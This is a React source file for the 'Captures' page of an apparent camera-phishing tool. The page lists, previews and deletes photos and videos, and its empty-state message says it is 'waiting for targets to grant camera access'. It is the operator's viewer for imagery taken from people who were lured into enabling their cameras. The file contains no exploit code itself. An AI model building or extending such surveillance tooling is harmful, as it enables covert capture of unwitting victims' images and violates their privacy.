import { useEffect, useState } from 'react'
import { api, Capture } from '../api/client'

function fmtSize(b: number) {
  if (b < 1024) return `${b} B`
  if (b < 1048576) return `${(b / 1024).toFixed(1)} KB`
  return `${(b / 1048576).toFixed(2)} MB`
}
function relTime(ts: number) {
  const diff = Date.now() / 1000 - ts
  if (diff < 60) return `${Math.floor(diff)}s ago`
  if (diff < 3600) return `${Math.floor(diff / 60)}m ago`
  if (diff < 86400) return `${Math.floor(diff / 3600)}h ago`
  return `${Math.floor(diff / 86400)}d ago`
}

export default function Captures() {
  const [captures, setCaptures] = useState<Capture[]>([])
  const [loading, setLoading] = useState(true)
  const [lightbox, setLightbox] = useState<number | null>(null)
  const [sort, setSort] = useState('newest')

  const refresh = async () => {
    try {
      const data = await api.captures(1, 60, sort)
      setCaptures(data.captures)
    } catch (e) { console.error(e) }
    finally { setLoading(false) }
  }

  useEffect(() => {
    refresh()
    const timer = setInterval(refresh, 5000)
    return () => clearInterval(timer)
  }, [sort])

  const del = async (id: string, e: React.MouseEvent) => {
    e.stopPropagation()
    if (!confirm('Delete this capture?')) return
    await api.deleteCapture(id)
    refresh()
  }

  const delAll = async () => {
    if (!confirm('Delete ALL captures?')) return
    if (!confirm('Are you absolutely sure?')) return
    await api.deleteAllCaptures()
    refresh()
  }

  const isVideo = (ft: string) => ft.includes('video')

  return (
    <div>
      <div className="flex items-center justify-between mb-6">
        <h2 className="text-xl font-bold text-white">Captures ({captures.length})</h2>
        <div className="flex gap-2">
          <select value={sort} onChange={e => setSort(e.target.value)} className="bg-gray-900 border border-gray-800 rounded-lg px-3 py-1.5 text-sm text-gray-300">
            <option value="newest">Newest</option>
            <option value="oldest">Oldest</option>
            <option value="largest">Largest</option>
            <option value="smallest">Smallest</option>
          </select>
          <button onClick={refresh} className="px-3 py-1.5 bg-gray-800 text-gray-300 rounded-lg text-sm hover:bg-gray-700">🔄</button>
          <button onClick={delAll} className="px-3 py-1.5 bg-red-500/10 text-red-400 rounded-lg text-sm hover:bg-red-500/20">🗑 All</button>
        </div>
      </div>

      {loading ? <div className="text-gray-500">Loading...</div> :
       captures.length === 0 ? (
        <div className="text-center py-20 text-gray-600">
          <div className="text-5xl mb-4 opacity-30">📷</div>
          <h3 className="text-lg text-gray-400">No captures yet</h3>
          <p className="text-sm mt-1">Waiting for targets to grant camera access...</p>
        </div>
       ) : (
        <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 gap-3">
          {captures.map((c, i) => {
            const recent = Date.now() / 1000 - c.created_at < 60
            return (
              <div
                key={c.id}
                onClick={() => setLightbox(i)}
                className={`bg-gray-900 border rounded-xl overflow-hidden cursor-pointer hover:border-cyan-500/50 transition-all hover:-translate-y-0.5 ${recent ? 'border-green-500/50' : 'border-gray-800'}`}
              >
                {isVideo(c.file_type) ? (
                  <div className="h-32 flex items-center justify-center bg-gray-950 text-3xl">🎬</div>
                ) : (
                  <img src={c.url} alt={c.filename} loading="lazy" className="h-32 w-full object-cover" />
                )}
                <div className="p-2">
                  <div className="text-xs text-gray-400 truncate">{c.filename}</div>
                  <div className="flex justify-between mt-1">
                    <span className="text-[10px] text-gray-600">{relTime(c.created_at)}</span>
                    <span className="text-[10px] text-gray-600">{fmtSize(c.file_size)}</span>
                  </div>
                </div>
                <button onClick={e => del(c.id, e)} className="absolute top-1 right-1 w-5 h-5 rounded-full bg-red-500/80 text-white text-xs hidden group-hover:flex items-center justify-center">×</button>
              </div>
            )
          })}
        </div>
      )}

      {lightbox !== null && captures[lightbox] && (
        <div className="fixed inset-0 bg-black/90 z-50 flex items-center justify-center p-6" onClick={() => setLightbox(null)}>
          <button className="absolute top-4 right-6 text-white text-4xl" onClick={() => setLightbox(null)}>×</button>
          {isVideo(captures[lightbox].file_type) ? (
            <video src={captures[lightbox].url} controls autoPlay className="max-w-[95%] max-h-[85vh] rounded-lg" />
          ) : (
            <img src={captures[lightbox].url} className="max-w-[95%] max-h-[85vh] rounded-lg" />
          )}
          <div className="absolute bottom-4 left-1/2 -translate-x-1/2 text-gray-400 text-sm">
            {captures[lightbox].filename} · {fmtSize(captures[lightbox].file_size)}
          </div>
        </div>
      )}
    </div>
  )
}
